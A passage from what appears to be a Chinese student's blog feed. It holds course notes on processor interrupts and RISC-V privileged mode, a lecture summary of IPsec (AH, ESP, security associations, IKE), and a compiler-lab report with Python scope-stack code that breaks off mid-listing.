系统可能会进行某些内部调整或转换, 但读取时, 总是得到你写入的地址.</p></li></ol><h2 id="Exception-1"><a href="#Exception-1" class="headerlink" title="Exception"></a>Exception</h2><ul><li>处理器<strong>内部产生</strong>, 可能可恢复, 也可能无法恢复.</li><li>异常恢复后重新执行<strong>本条指令</strong>.</li><li><p>IF: 访存地址不对齐; 访存缺页.</p><ul><li>ID: 非法指令.</li></ul></li><li><p>EXE: 除 0 计算.</p></li><li><p>MEM: 访存地址不对齐; 访存缺页.</p></li><li><p>WB: 无.</p></li></ul><h2 id="Interruption"><a href="#Interruption" class="headerlink" title="Interruption"></a>Interruption</h2><ul><li>处理器<strong>外部产生</strong>, 可恢复执行.</li><li>中断处理后跳到<strong>下一条指令</strong>执行.</li><li>保存和恢复由软件和硬件一同进行. 通用寄存器由软件操作, 特殊寄存器 (包括 PC, cause, IE) 由硬件进行.</li><li>发生中断时, 硬件将 PC 设为<strong>中断处理函数入口地址</strong>, 入口地址可以使用固定常数 (MIPS), 硬件将其进行硬编码, 也可以写入特殊寄存器 (Risc-V), 由硬件进行设置. 中断处理函数可以有<strong>多个</strong>, 操作系统提供多个入口; 也可以有<strong>一个</strong>, 根据中断 cause 跳转到不同的地址, 如中断向量表.</li><li>将中断安排在 <strong>EXE 和 MEM 阶段之间</strong>, 等待前面指令执行完毕, 使用 bubble 信号排空后面的指令, 再进行中断异常处理, 称为<strong>精确的中断和异常</strong>.</li></ul><h2 id="Privileged-Mode"><a href="#Privileged-Mode" class="headerlink" title="Privileged Mode"></a>Privileged Mode</h2><ul><li>硬件隔离: 性能损失少; 软件隔离: 性能损失多.</li><li>mtvec, mepc, mcause 在异常处理中由硬件保存.</li><li>mie, mip, mtval, mscratch, mstatus.</li><li>内存隔离机制: 通知 CPU 内存地址范围及处理权限, 将 APP 与 OS 隔离.<ul><li>地址映射将 APP 与 APP 隔离;</li><li>限制用户程序不更改监控程序;</li><li>限制 MEM 段 load/store 指令的行为;</li><li>否则抛出异常 (X86: Segment; Risc-V: PMP).</li></ul></li><li>只有 mret 将 pc 设置为 mepc, 切换 M 模式为 U 模式. 可以通过将 mepc 设置为其他程序的运行入口, 实现<strong>操作系统调度器</strong>.</li><li>异常、中断、硬件控制 (外设) 由 M 模式进行, 例如发起系统调用时, U 模式会主动切换到 M 模式, 相当于主动触发异常.</li><li><strong>进入</strong>中断处理函数<strong>前</strong>, 硬件保存中断地址到 mepc, 中断原因到 mcause, 将地址置为 mtvec, 将 mstatus 中的中断使能 mie 保存到 mpie, mie 置 0, 将权限模式保存到 mpp; <strong>进入</strong>中断处理函数<strong>后</strong>, 软件保存 mepc, mcause 到 stack 上, 然后软件将 mie 置 1, 此时可以支持嵌套的中断和异常; <strong>离开</strong>中断处理函数<strong>前</strong>, 软件将 mie 置 0, 并恢复 mepc, mcause, 硬件将 mie 置 1.</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Organization &amp; Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Organization &amp; Design </tag>
            
            <tag> SV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络安全技术 笔记5</title>
      <link href="/2023/11/15/ji-suan-ji-wang-luo-an-quan-ji-zhu-bi-ji-5/"/>
      <url>/2023/11/15/ji-suan-ji-wang-luo-an-quan-ji-zhu-bi-ji-5/</url>
      
        <content type="html"><![CDATA[<h1 id="五、网络层安全协议-IPsec"><a href="#五、网络层安全协议-IPsec" class="headerlink" title="五、网络层安全协议 IPsec"></a>五、网络层安全协议 IPsec</h1><h2 id="IPsec-网络层安全协议"><a href="#IPsec-网络层安全协议" class="headerlink" title="IPsec: 网络层安全协议"></a>IPsec: 网络层安全协议</h2><ul><li>IP 协议的安全特性:<ul><li>无连接, 不保证顺序到达.</li><li>重复包, 丢失包.</li><li>设备简单, 无状态.</li><li>不提供认证, 完整性, 保密性.</li><li>访问控制基于 IP 地址, 不完备.</li></ul></li><li>IPsec 保障 IP 级安全:<ul><li>认证, 保密, 密钥管理.</li><li>在 IP 层加密(或)认证所有流量.</li><li>网络层实现端到端的安全性:<ul><li>数据源认证机制.</li><li>数据加密机制.</li><li>密钥管理.</li></ul></li></ul></li><li>IPsec 的应用:<ul><li>分支机构通过互联网虚拟专用网安全互联.</li><li>终端用户远程安全访问互联网.</li><li>与合作者建立外联网和内联网联系.</li><li>加强电子商务安全性.</li></ul></li><li>IPsec 的实施:<ul><li>主机实现 (与操作系统集成):<ul><li>保障端到端安全.</li><li>对用户每个会话提供安全保障.</li><li>对应用透明, 不必修改用户或服务器软件.</li><li>对最终用户透明.</li></ul></li><li>防火墙实施:<ul><li>无须改变操作系统.</li><li>为内部所有应用提供安全服务.</li></ul></li><li>路由器实施:<ul><li>虚拟专用网 VPN.</li><li>对通过公用网络的两个子网的流动数据提供安全保护.</li></ul></li></ul></li></ul><h3 id="IPsec-体系结构"><a href="#IPsec-体系结构" class="headerlink" title="IPsec 体系结构"></a>IPsec 体系结构</h3><h4 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h4><ul><li><p>包认证和包加密在主 IP 报头中使用扩展报头 AH/ESP 实现安全性.</p></li><li><p>IPv6 必须支持这些特性, IPv4 可选.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709258.png" alt=""></p></li><li><p>IPsec 文档:</p><ul><li>体系结构: IPsec 技术一般性概念、需求和机制.</li><li>认证头 AH: 扩展域, 提供数据源发认证和完整性保护.</li><li>封装安全载荷 ESP: 扩展域, 提供数据保密、源发认证和完整性保护.</li><li>加密算法: 描述 ESP 使用的加密算法.</li><li>认证算法: 描述 AH 使用的认证算法和 ESP 认证选项.</li><li>密钥管理: 描述密钥管理模式.</li><li>解释域 (DOI): 其他文档彼此联系需要的值, 包括算法标识及操作参数.</li></ul></li></ul><h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><ul><li><p>IPsec 安全服务:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709259.png" alt=""></p></li></ul><h4 id="安全关联"><a href="#安全关联" class="headerlink" title="安全关联"></a>安全关联</h4><ul><li><p>安全关联 SA 是 IPsec 通信双方对要素的协商, 是安全信息参数集合.</p><ul><li>包括协议、操作模式、密码算法、认证算法、密钥、生存期.</li><li>SA 是发送方和接收方的单向关系, 为双方通信提供安全服务.</li><li>双方安全交换需建立两个 SA.</li><li>安全服务可由 AH 或 ESP 提供, 但不能两者都提供.</li></ul></li><li><p>SA 确定参数:</p><ul><li>安全参数索引 SPI:<ul><li>和 SA 相关的位串, 仅在本地有意义.</li><li>由 AH 和 ESP 携带, 接收方能选择合适 SA 处理包.</li></ul></li><li>IP 目的地址 IPDA:<ul><li>单一地址, 表示 SA 目的地址.</li><li>用户末端系统、防火墙或路由器.</li></ul></li><li>安全协议标识:<ul><li>标识关联是 AH 或 ESP 安全关联.</li></ul></li></ul></li><li><p>SA 安全参数:</p><ul><li><p>序列号计数器 (must):</p><ul><li>32 位整数, 用于生成 AH 或 ESP 头序列号域.</li><li>SA 保护包时增 1, 溢出后 SA 重新协商.</li><li>防范重放攻击.</li></ul></li><li><p>序列号溢出标志 (must):</p><ul><li>值 1 时产生审查事件, 阻止该 SA 继续下发数据包.</li></ul></li><li><p>反重放窗口 (must):</p><ul><li><p>决定输入 AH 或 ESP 报文是否是重放的计数器.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709260.png" alt=""></p></li></ul></li><li><p>AH 信息组 (AH must):</p><ul><li>认证算法, 密钥, 密钥生存期和 AH 的相关参数.</li></ul></li><li><p>ESP 信息组 (ESP must):</p><ul><li>加密和认证算法, 密钥, 初始值, 密钥生存期和 ESP 的相关参数.</li></ul></li><li><p>SA 生存期.</p><ul><li>生存期结束, SA 终止或用新 SA 替换.</li></ul></li><li><p>IPsec 协议模式 (must):</p><ul><li>隧道模式或传输模式.</li></ul></li><li><p>Path MTU (must):</p><ul><li>最大传送单位路径和迟滞变量.</li></ul></li></ul></li><li><p>安全关联数据库 SADB: 定义 SA.</p><ul><li>IP 数据包中, SA 由 IPv4 或 IPv6 报头中目的地址唯一标识.</li><li>SPI 封装在 AH 或 ESP 扩展头中.</li><li>收到数据包, 解析三元组 [SPI - 目的地址 - AH/ESP], 并查找 SADB:<ul><li>匹配的条目: 将参数与 AH 或 ESP 头中相关域比较, 一致则处理该数据包, 不一致则丢弃.</li><li>没有匹配的条目: 输入包—丢弃; 输出包—创建新 SA, 存入 SADB.</li></ul></li><li>定义与 SA 关联的参数, 决定进行何种安全操作.</li></ul></li><li><p>选择子:</p><ul><li>大粒度区分需要和不需要 IPsec 保护的流量.</li><li>通过 SPDB 定义 IP 流量与特定 SA 相关.</li><li>SPDB 包括定义 IP 流量子集的入口, 指向该流量 SA 的指针.<ul><li>多个 SPDB 入口可与一个 SA 相连.</li><li>多个 SA 可与一个 SPDB 入口相连.</li></ul></li><li>每个 SPDB 入口由 IP 集合和上层协议定义，称为选择子.<ul><li>过滤输出流量, 并映射到特定 SA.<ul><li>SPDB 中比较相应域的值, 寻找匹配入口, 可能是零或多个.</li><li>存在 SA, 则选定 SA 和关联的 SPI 执行 IPsec 处理.</li></ul></li></ul></li></ul></li><li><p>安全策略数据库 SPDB: 使用 SA.</p><ul><li>定义、标识、管理和维护安全策略:<ul><li>Discard: 不让包进入或外发.</li><li>Bypass: 不对进入或外发包进行安全服务.</li><li>Apply: 对外发包提供安全服务, 认为接收包已进行安全服务.</li></ul></li><li>包括定义 IP 流量子集的入口, 指向该流量 SA 的指针.</li><li>定义 IP 流量与特定 SA 相关, 决定对哪些出入数据包进行安全操作.</li></ul></li></ul><h4 id="传输模式与隧道模式"><a href="#传输模式与隧道模式" class="headerlink" title="传输模式与隧道模式"></a>传输模式与隧道模式</h4><ul><li><p>传输模式:</p><ul><li>为上层协议提供保护, 同时增加 IP 包载荷保护.</li><li><p>典型: 两台主机间的端到端通信.</p><ul><li>传输模式 AH 认证 IP 载荷和报头选中部分.</li><li>传输模式 ESP 加密(和认证) IP 载荷, 不包括报头.</li></ul><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709261.png" alt=""></p></li></ul></li><li><p>隧道模式:</p><ul><li>对整个 IP 包提供保护, 加上 AH/ESP 域后, 整个数据包和安全域当作新 IP 载荷, 并拥有一个新的外部 IP 报头.</li><li><p>新 IP 包利用隧道在网络中传输, 路由器不能检查内部 IP 报头.</p><ul><li>隧道模式 AH 认证整个内部 IP 包和外部 IP 报头选中部分.</li><li>隧道模式 ESP 加密(和认证)整个内部 IP 包, 包括内部 IP 报头.</li></ul><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709262.png" alt=""></p></li></ul></li></ul><h3 id="认证头-AH"><a href="#认证头-AH" class="headerlink" title="认证头 AH"></a>认证头 AH</h3><ul><li><p>数据完整性: 包传输过程中内容不可更改.</p></li><li><p>认证: 末端系统或网络设备对用户者应用程序进行认证, 提供流量过滤功能, 防止地址欺诈攻击和重放攻击, 基于共享公钥的消息认证码 MAC.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709263.png" alt=""></p></li><li><p>传输模式:</p><ul><li>不修改 IP 头, 只添加 AH 头.</li></ul></li><li><p>隧道模式:</p><ul><li>整个 IP 包作为数据, 增加一个新的 IP 头、AH 头.</li></ul></li><li><p>处理接收数据包:</p><ul><li>从端口收到输入数据包, 解析 SA 三元组, 查找 SADB.<ul><li>查找到匹配 SA 条目, 将参数与数据包域参数比较:<ul><li>一致则处理; 不一致则丢弃.</li></ul></li><li>没有查找到匹配 SA 条目, 丢弃该数据包</li></ul></li><li>使用滑动窗口, 检查序列号重放.</li><li>计算 ICV, 和数据包中值比较:<ul><li>相等则恢复数据包, 转 IP 协议栈路由; 不相等则丢弃并审计事件.</li></ul></li></ul></li><li><p>处理输出数据包:</p><ul><li>从 IP 协议栈收到转发数据包, 使用选择子查找 SPDB, 获取安全策略.</li><li>确定实施 IPsec 处理, 查找 SADB.<ul><li>SA 未建立, 调用 IKE 协商新的 SA.</li><li>SA 已建立, 直接进行下一步.</li></ul></li><li>产生序列号, 防止重放攻击.</li><li><p>选取参数计算 ICV, 转发报文.</p><div style="display: flex; justify-content: center;">   <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709264.png" style="margin-right: 10px;" width="200">   <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709265.png" style="margin-left: 10px;" width="200"> </div></li></ul></li></ul><h3 id="封装安全载荷-ESP"><a href="#封装安全载荷-ESP" class="headerlink" title="封装安全载荷 ESP"></a>封装安全载荷 ESP</h3><ul><li><p>保密性: 报文内容保密和流量限制保密.</p></li><li><p>认证: 与 AH 相同.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709266.png" alt=""></p></li><li><p>填充域功能:</p><ul><li>加密算法需要明文是倍数, 填充域扩展明文长度.</li><li>填充长度和邻接头域为右对齐的 32 位字.</li><li>隐藏载荷实际长度, 提供部分流量保护.</li></ul></li><li><p>传输模式:</p><ul><li>不修改 IP 头, 只添加 ESP 头与 ESP 尾, 可选添加 MAC.</li></ul></li><li><p>隧道模式:</p><ul><li>整个包为数据, 增加一个新的 IP 头、ESP 头、ESP 尾, 可选添加 MAC.</li></ul></li><li><p>处理接收数据包:</p><ul><li>从端口收到输入数据包, 解析 SA 三元组, 查找 SADB.<ul><li>查找到匹配 SA 条目, 将参数与数据包域参数比较:<ul><li>一致则处理; 不一致则丢弃.</li></ul></li><li>没有查找到匹配 SA 条目, 丢弃该数据包</li></ul></li><li>使用滑动窗口, 检查序列号重放.</li><li>计算 ICV, 和数据包中值比较:<ul><li>相等则恢复数据包, 转 IP 协议栈路由; 不相等则丢弃并审计事件.</li></ul></li><li>根据 SA 指定的算法/密钥/参数, 解密数据, 重构原始 IP 包, 准备路由.</li></ul></li><li><p>处理输出数据包:</p><ul><li>从 IP 协议栈收到转发数据包, 使用选择子查找 SPDB, 获取安全策略.</li><li>确定实施 IPsec 处理, 查找 SADB.<ul><li>SA 未建立, 调用 IKE 协商新的 SA.</li><li>SA 已建立, 直接进行下一步.</li></ul></li><li>产生序列号, 防止重放攻击.</li><li>选取参数加密数据报.</li><li><p>选取参数计算 ICV, 分片并转发报文.</p><div style="display: flex; justify-content: center;">   <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709267.png" style="margin-right: 10px;" width="200">   <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709268.png" style="margin-left: 10px;" width="200"> </div></li></ul></li></ul><h3 id="安全关联组合"><a href="#安全关联组合" class="headerlink" title="安全关联组合"></a>安全关联组合</h3><ul><li>单个 SA 可实现 AH 或 ESP, 但不能都实现.</li><li>例: 特定流量需在主机间提供 IPsec 服务, 安全网关间提供相同流量分离服务.</li><li>安全关联组合:<ul><li>提供特定 IPsec 服务集所需的 SA 序列.</li><li>传输邻接: 不使用隧道, 对一个 IP 包使用多个安全协议, 组合 AH 和 ESP 仅允许一级组合.</li><li>隧道迭代: 通过隧道应用多层安全协议, 允许多层嵌套.</li></ul></li></ul><h2 id="IKE-为-IPsec-管理密钥"><a href="#IKE-为-IPsec-管理密钥" class="headerlink" title="IKE: 为 IPsec 管理密钥"></a>IKE: 为 IPsec 管理密钥</h2><ul><li>IPsec 支持两种密钥管理类型:<ul><li>手工: 系统管理员手动配置, SA 永远存在, 小规模、结构简单网络.</li><li>自动: 大型分布系统中, SA 协商产生, 复杂拓扑和高安全性网络.</li></ul></li><li>IKE 协议简介:<ul><li>为 IPsec 自动协商交换密钥, 建立 SA, 维护 SADB.</li><li>在不安全网络环境中, 安全建立或更新共享密钥.</li><li>通用协议, 可为 SNMPv3, RIPv2, OSPFv2 等保密协议协商参数.</li><li>目前只在 IPsec 得到应用.</li><li>精髓:<ul><li>不在不安全网络上直接传送密钥.</li><li>通过一系列数据交换, 通信双方计算出共享密钥.</li></ul></li><li>核心技术:<ul><li>DH 秘钥交换算法, 完善的前向安全性 PFS.</li><li>一个密钥被破解, 不影响其他密钥安全性, 密钥没有派生关系.</li></ul></li><li>混合协议:<ul><li>ISAKMP 协议的格式和阶段.</li><li>Oakley 协议的模式.</li><li>SKEME 协议的验证公钥加密方法, 定义两种密钥交换方式.</li></ul></li></ul></li></ul><h3 id="IKE-报文格式"><a href="#IKE-报文格式" class="headerlink" title="IKE 报文格式"></a>IKE 报文格式</h3><ul><li>继承自 ISAKMP.</li><li>在任何传输层或 IP 层上实现, UDP 协议端口 500 传输.</li><li>交换信息形式: 定长报文头, 不定数量载荷.</li><li>定义 13 种载荷 (SSL 握手协议定义了 10 种).</li></ul><h3 id="IKE-体系结构"><a href="#IKE-体系结构" class="headerlink" title="IKE 体系结构"></a>IKE 体系结构</h3><ul><li><p>第一阶段:</p><ul><li><p>协商创建通信信道 IKE SA, 对信道进行验证.</p></li><li><p>为进一步 IKE 通信提供机密性、完整性及消息源验证.</p></li><li><p>主模式:</p><ul><li>6 个消息交互.</li><li><p>对通信双方的身份保护.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709269.png" alt=""></p></li></ul></li><li><p>积极模式:</p><ul><li>3 个消息交互.</li><li>适用于一方地址为动态的情况.</li><li><p>身份保护不必要, 减少信息传输, 提高协商效率.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301709270.png" alt=""></p></li></ul></li></ul></li><li><p>第二阶段:</p><ul><li>使用建立的 IKE SA 建立 IPsec SA.</li><li>快速模式:<ul><li>3 个消息交互.</li><li>一个 IKE SA 协商可为多个 IPsec SA 协商提供服务.</li><li>协商内容与协商安全协议相关.</li><li>使用快速模式信息交换, 一个第二阶段协商可建立多个 SA.</li></ul></li></ul></li></ul><h3 id="IKE-工作模式"><a href="#IKE-工作模式" class="headerlink" title="IKE 工作模式"></a>IKE 工作模式</h3><ul><li>传输模式:<ul><li>端节点到端节点, 均实现 IPsec.</li><li>IP 头与数据间插入 IPsec 头, 保护数据载荷.</li></ul></li><li>隧道模式:<ul><li>安全网关到安全网关.</li><li>端系统无需实现 IPsec, 网络节点完成保护功能.</li><li>内部 IP 头包含实际端节点 IP 地址.</li></ul></li><li>工作模式: 嵌套组合.<ul><li>端节点到安全网关模式.</li><li>外部目的地址总是安全网关的地址.</li><li>内部目的地址是数据包的最终地址.</li></ul></li></ul><h3 id="IKE-工作过程"><a href="#IKE-工作过程" class="headerlink" title="IKE 工作过程"></a>IKE 工作过程</h3><ul><li>IKE 以守护进程方式后台运行.</li><li>启动 IKE 服务:<ul><li>内核提交创建 IKE SA 请求.</li><li>同级 IKE 守护进程提交协商 SA 请求.</li></ul></li><li>两个守护进程通过 UDP 协议 500 端口传递消息.</li><li>使用 SADB 和 SPDB 数据库, 保存在操作系统内核.</li><li>工作过程:<ul><li>首先查询 SPDB, SPDB 条目隐藏指针, 决定丢弃/绕过/应用.</li><li>IPsec 查询 SADB, 检查合适 SA:<ul><li>有则进行 IPsec 处理.</li><li>没有则向 IKE 守护进程发出创建 SA 请求.</li></ul></li><li>IKE 守护进程查询 SPDB, 得到协商参数, 向远程 IKE 进程发出协商请求.<ul><li>协商成功, 新协商 SA 增加到 SADB.</li><li>协商未成功, IKE 进程提示管理员配置 SPDB 参数.</li></ul></li><li>管理员指示 IKE 守护进程不再使用某 SA, IKE 守护进程从 SADB 中删除 SA, 向远地 IKE 守护进程发送删除信息.</li><li>远地 IKE 进程:<ul><li>删除相应 SA.</li><li>忽略信息, 保留相应 SA, 但不允许使用其继续通信.</li></ul></li></ul></li></ul><h3 id="IKE-不足"><a href="#IKE-不足" class="headerlink" title="IKE 不足"></a>IKE 不足</h3><ul><li>IKE 是复杂混合协议集合, 局限于为 IPsec 建立安全关联 SA.</li><li>标准定义复杂, 导致理解困难, 不同实现互操作困难.</li><li>协商消息往返次数多, 消耗计算以网络带宽资源.</li><li>容易受到拒绝服务攻击、中间人攻击、重放攻击.</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Network Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理 实验3</title>
      <link href="/2023/11/12/bian-yi-yuan-li-lab-3/"/>
      <url>/2023/11/12/bian-yi-yuan-li-lab-3/</url>
      
        <content type="html"><![CDATA[<h1 id="Stage-3-报告"><a href="#Stage-3-报告" class="headerlink" title="Stage 3 报告"></a>Stage 3 报告</h1><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h3 id="step-6"><a href="#step-6" class="headerlink" title="step 6"></a>step 6</h3><p><strong>语义分析</strong>: 实现了 <code>ScopeStack</code> 数据结构维护层次嵌套的作用域.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/scope/scopestack.py</span><span class="token keyword">class</span> <span class="token class-name">ScopeStack</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> globalScope<span class="token punctuation">:</span> Scope<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>globalScope <span class="token operator">=</span> globalScope        self<span class="token punctuation">.</span>scopeStack <span class="token operator">=</span> <span class="token punctuation">[</span>globalScope<span class="token punctuation">]</span>        self<span class="token punctuation">.</span>scopeDepth <span class="token operator">=</span> <span class="token number">512</span>    <span class="token keyword">def</span> <span class="token function">open</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> scope<span class="token punctuation">:</span> Scope<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>scopeStack<span class="token punctuation">)</span> <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>scopeDepth<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>scopeStack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>scope<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> ScopeOverflowError    <span class="token keyword">def</span> <span class="token function">close</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>scopeStack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">top</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Scope<span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>scopeStack<span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>scopeStack<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>scopeStack<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>globalScope  <span class="token comment"># 复用 Scope 类的成员函数</span>    <span class="token keyword">def</span> <span class="token function">isGlobalScope</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>top<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isGlobalScope<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">declare</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> symbol<span class="token punctuation">:</span> Symbol<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>top<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>declare<span class="token punctuation">(</span>symbol<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">lookup</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Optional<span class="token punctuation">[</span>Symbol<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>top<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lookup<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">lookupOverStack</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Optional<span class="token punctuation">[</span>Symbol<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> scope <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>scopeStack<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> scope<span class="token punctuation">.</span>containsKey<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> scope<span class="token punctuation">.</span>get<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将 <code>frontend/typecheck/namer.py</code>, <code>frontend/typecheck/typer.py</code> 的上下文信息修改为 “作用域栈” 后, 修改符号表建立过程的 <code>visitBlock</code> 函数, 开启一个代码块时, 新建作用域并压栈; 退出代码块时, 弹栈关闭作用域. <code>ScopeStack</code> 中为定义变量复用了 <code>Scope.lookup</code> 函数, 逐层查找变量实现 <code>ScopeStack.lookupOverStack</code> 函数.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/typecheck/namer.py</span><span class="token keyword">def</span> <span class="token function">visitBlock</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> block<span class="token punctuation">:</span> Block<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> ScopeStack<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    ctx<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>Scope<span class="token punctuation">(</span>ScopeKind<span class="token punctuation">.</span>LOCAL<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> child <span class="token keyword">in</span> block<span class="token punctuation">:</span>        child<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span>    ctx<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">visitDeclaration</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> decl<span class="token punctuation">:</span> Declaration<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> ScopeStack<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> ctx<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span>decl<span class="token punctuation">.</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">def</span> <span class="token function">visitIdentifier</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ident<span class="token punctuation">:</span> Identifier<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> ScopeStack<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    symbol <span class="token operator">=</span> ctx<span class="token punctuation">.</span>lookupOverStack<span class="token punctuation">(</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>后端</strong>: 增加了 <code>reachable</code> 函数, 使用 BFS 算法判断某个基本块是否可达.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># backend/dataflow/cfg.py</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nodes<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>BasicBlock<span class="token punctuation">]</span><span class="token punctuation">,</span> edges<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token 